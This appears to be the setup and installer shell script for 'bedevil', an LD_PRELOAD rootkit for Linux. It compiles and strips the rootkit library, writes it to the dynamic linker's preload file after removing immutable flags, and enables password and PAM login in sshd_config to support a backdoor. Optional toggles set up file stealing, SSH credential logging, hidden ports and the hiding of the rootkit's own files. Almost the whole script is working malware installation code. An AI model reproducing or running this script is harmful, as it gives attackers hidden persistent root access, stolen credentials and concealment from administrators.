#!/bin/bash

[ -f .ascii ] && { printf "\e[1m\e[31m`cat .ascii`\e[0m\n"; sleep 0.5; }

source ./etc/dialog.sh
source ./etc/util.sh
source ./etc/defaults.sh
source ./etc/toggles.sh
source ./etc/headers.sh
source ./etc/arrays.sh
source ./etc/consts.sh
source ./etc/settings.sh

compile_bdvl(){
    [ ! -d "$NEW_MDIR" ] && { \
        eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; \
        exit; \
    }
    
    local warning_flags optimization_flags \
          options linker_options \
          linker_flags log_file

    warning_flags=(-Wall)
    optimization_flags=(-O0 -g0)
    options=(-fomit-frame-pointer -fPIC)
    linker_options=(-Wl,--build-id=none)
    linker_flags=(-ldl)
    [ `toggle_enabled USE_CRYPT` == "true" ] && linker_flags+=(-lcrypt)
    [ `toggle_enabled ACCEPT_USE_SSL` == "true" ] && linker_flags+=(-lssl)

    log_file=$BDVLSO.log
    printf "Beginning compilation\n\n" >> $log_file
    gcc -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
        -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.$PLATFORM >>$log_file
    gcc -m32 -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
        -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.i686 &>/dev/null
    printf "\nDone" >> $log_file

    [ `cat $log_file | wc -l` != 3 ] && necho "Compilation log written to $log_file"
    [ `cat $log_file | wc -l` == 3 ] && rm $log_file

    strip -s $BDVLSO.$PLATFORM 2>/dev/null || { eecho "Couldn't strip library, exiting"; exit; }
    [ -f $BDVLSO.i686 ] && strip -s $BDVLSO.i686

    [ -f $BDVLSO.$PLATFORM ] && \
        secho "`lib_size $PLATFORM`"
    [ -f $BDVLSO.i686 ] && \
        secho "`lib_size i686`"
}

install_bdvl(){
    [ `id -u` != 0 ] && { \
        eecho "You cannot install bedevil without root, exiting"; \
        exit; \
    }

    secho "Starting full installation!\n"

    local response="$(show_yesno "Patch dynamic linker libs?")"
    [ "$response" == 0 ] && patch_libdl || echo
    response="$(show_yesno "Install potential dependencies?")"
    [ "$response" == 0 ] && etc/install_deps.sh || echo

    populate_new_placeholders
    compile_bdvl

    necho "Installing to $INSTALL_DIR"
    [ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR/
    cp $BDVLSO.$PLATFORM $SOPATH
    cp $BDVLSO.i686 $INSTALL_DIR/$BDVLSO.i686 2>/dev/null

    if [ "`toggle_enabled USE_PAM_BD`" == "true" ]; then
        [ "`cat /etc/ssh/sshd_config | grep 'UsePAM'`" == "UsePAM yes" ] || \
            echo "UsePAM yes" >> /etc/ssh/sshd_config
        [ "`cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes'`" == "PasswordAuthentication yes" ] || \
            echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
    fi

    necho "Writing \$SOPATH to $LDSO_PRELOAD"
    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
    echo -n "$SOPATH" > $LDSO_PRELOAD
    secho "Installation finished"
    cleanup_bdvl
    echo

    setup_home $INSTALL_DIR
    secho "Installation complete!"
}

setup_home(){
    export ${BD_VAR}=1 # set this so we can do stuff

    if [ -f etc/bd_bashrc ]; then
        echo '. .bashrc' > "$1/.profile" && \
        cp etc/bd_bashrc "$1/.bashrc"
    fi

    for f in ${COPY_FILES[@]}; do cp $f $1/`basename $f` 2>/dev/null; done

    if [ `toggle_enabled FILE_STEAL` == "true" ]; then
        mkdir -p $INTEREST_DIR && \
        chmod 666 $INTEREST_DIR && \
        ln -s $INTEREST_DIR $1/interest_dir
    fi
    
    if [ `toggle_enabled LOG_SSH` == "true" ]; then
        touch $SSH_LOGS && \
        chmod 666 $SSH_LOGS && \
        ln -s $SSH_LOGS $1/ssh_logs
    fi

    if [ `toggle_enabled HIDE_PORTS` == "true" ]; then
        touch $HIDE_PORTS_PATH && chmod 644 $HIDE_PORTS_PATH
        for port in ${HIDE_PORTS[@]}; do echo "$port" >> $HIDE_PORTS_PATH; done
    fi

    if [ `toggle_enabled HIDE_SELF` == "true" ]; then
        local hide_files=($LDSO_PRELOAD $SSH_LOGS $INTEREST_DIR \
                          $1 $1/* $1/.profile $1/.bashrc $1/.ascii)

        necho "Hiding rootkit files"
        for file in ${hide_files[@]}; do chown 0:$MAGIC_GID $file 2>/dev/null; done
    fi

    unset $BD_VAR
}

USE_DIALOG=0
HELPMSG="
  Usage: $0 [option]
      Options:
          -h: Show this help message & exit.
          -u: Enable use of 'dialog' throughout setup.
          -e: Do an environment check.
          -t: Go through & switch rootkit toggles.
          -C: Clean up installation/compilation mess & exit.
          -d: Configure rootkit headers & settings.
          -c: Compile rootkit library in current directory & exit.
          -D: Install all potential required dependencies. (REQUIRES ROOT)
          -i: Launch full installation of bedevil. (REQUIRES ROOT)
"

while getopts "huetCdcDi?" opt; do
    case "$opt" in
    h)
        echo "$HELPMSG"
        exit
        ;;
    u)
        USE_DIALOG=1
        [ ! -f `bin_path dialog` ] && { \
            eecho "Could not find dialog..."; \
            unset USE_DIALOG; \
        }
        ;;
    e)
        etc/environ.sh
        ;;
    t)
        [ $USE_DIALOG == 0 ] && set_toggles || dialog_set_toggles
        ;;
    d)  
        populate_new_placeholders
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        etc/install_deps.sh
        ;;
    ?)
        echo "$HELPMSG"
        exit
        ;;
    esac
done

[ $OPTIND == 1 ] && echo "$HELPMSG"